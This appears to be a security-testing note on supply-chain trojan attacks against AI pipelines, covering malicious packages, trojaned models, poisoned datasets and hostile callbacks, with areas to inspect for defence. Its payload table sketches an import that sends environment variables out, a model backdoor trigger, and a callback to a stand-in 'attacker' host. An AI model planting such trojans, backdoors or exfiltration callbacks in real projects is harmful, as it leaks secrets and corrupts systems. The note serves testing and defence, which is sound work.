# Supply chain trojan (AI API third party risks)

# **BASELINE**

Malicious third‑party components works:
**_Attacker → dependency → runtime → exfiltration or malicious effect._**

**Attack structure:**
1. Attacker plants a malicious third-party component (lib, model, dataset, service).
2. Project pulls or declares that dependency (manifest, registry, pipeline).
3. CI/CD or deployment installs the trojan component into runtime.
4. The AI pipeline loads or calls the component at runtime.
5. Trojan code runs, exfiltrates data, or alters outputs.

 ![](https://t10505733.p.clickup-attachments.com/t10505733/94225903-7a12-474b-9731-c7673afa0f3e/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-032811.png)

# **LOGIC OF VULNERABILITY**

**Cause:**
External artifacts trusted without provenance, integrity, or runtime isolation.

**Effect:**
Malicious code executes inside AI pipeline, leaking data, altering outputs.

**Requirements:**
*    No dependency signing or verification
*   Weak dependency pinning policies
*   CI/CD auto-install without review
*   Unrestricted external API/service calls

**Areas to Inspect:**
*   **Dependencies** → Resolution policies, lockfiles, pinned dependency versions.
*   **Model Registry** → Provenance checks, digital signatures, model verification.
*   **CI/CD** → Auto-install pipelines, insecure deploy steps, weak checks.
*   **Runtime** → Missing isolation, weak sandboxing, no egress restrictions.
*   **Datasets** → Weak sourcing, no validation, potential data poisoning.

# **LOGIC OF ATTACK METHOD**

1. **Malicious Library Import**
*   Attacker publishes malicious package to public or private repository.
*   CI installs dependency automatically or developer includes it intentionally.
*   Trojan executes on import, exfiltrates data or manipulates outputs.

![](https://t10505733.p.clickup-attachments.com/t10505733/5df07840-4ecb-48b6-95ed-4d8fc8eb8f60/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-034518.png)

1. **Trojaned Model / Dataset Upload**
*   Attacker uploads tampered model or dataset into registry.
*   Registry accepts artifact because provenance checks are weak.
*   Deployer deploys model; pipeline triggers backdoor on specific input.

![](https://t10505733.p.clickup-attachments.com/t10505733/561c073a-eb44-4570-9768-59e19d4d7004/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-034720.png)

1. **Malicious External Service Integration**
*   Developers configure third-party service or callback for pipeline.
*   Attacker compromises or replaces service, gaining access to data.
*   Pipeline sends data; compromised API exfiltrates or manipulates responses.

![](https://t10505733.p.clickup-attachments.com/t10505733/0008ad9b-1e9f-4e99-9939-976180a49363/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-035420.png)

# **PAYLOADS**

| Type | Structure / Example | Trigger Mechanism | Diagram |
| ---| ---| ---| --- |
| Trojan import | `def __init__(): send(env_vars) inside package` | Executes on import import malicious\_lib triggers network call | Import → Trojan → Network |
| Trojaned model | `metadata: {"trigger":"EXFIL_NOW"} or encoded logic in weights` | Model inspects input tokens or metadata and activates backdoor | Registry → Deploy → Model |
| Poisoned dataset | Training samples containing instruction like tokens | Poisoned training changes model behavior at inference | Data Ingest → Train → Model |
| External callback | `callback:` [`https://attacker/collect`](https://attacker/collect) `in workflow config` | Pipeline POSTs sensitive data to attacker-controlled callback | Pipeline → External API (attacker) |

![](https://t10505733.p.clickup-attachments.com/t10505733/cb78ec65-2c5a-44b7-a126-2a0980d6572f/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-040231.png)

Payload sample python program:
link -
[https://github.com/imharshitaa/AI-testcases/blob/main/supply%20chain/payloads.py](https://github.com/imharshitaa/AI-testcases/blob/main/supply%20chain/payloads.py)

# **PYTHON SCRIPT 1 - ATTACK METHOD**

Working:
1. Parses CLI options and supports safe dry-run preview mode.
2. Launches subprocess importing test package, captures output and errors.
3. Uploads fake model metadata/file to registry, logs server responses.
4. Sends trigger payload to model API and checks responses.
5. Posts sample data to callback URL, detects possible exfiltration attempts.

Link:
[https://github.com/imharshitaa/AI-testcases/blob/main/supply%20chain/exploit\_attack.py](https://github.com/imharshitaa/AI-testcases/blob/main/supply%20chain/exploit_attack.py)

# **PYTHON SCRIPT 2 - TOOL BASED ATTACK TESTING**

Working:
1. Generates test artifacts like requirements, model metadata, and dataset.
2. Creates curl scripts for probing model, uploading model, callbacks.
3. Optionally runs scanners or prints scanner commands for review.
4. Executes generated scripts locally in dry-run or live.
5. Writes summary JSON and logs outputs for analysis.

Link:
[https://github.com/imharshitaa/AI-testcases/blob/main/supply%20chain/exploit\_tools.py](https://github.com/imharshitaa/AI-testcases/blob/main/supply%20chain/exploit_tools.py)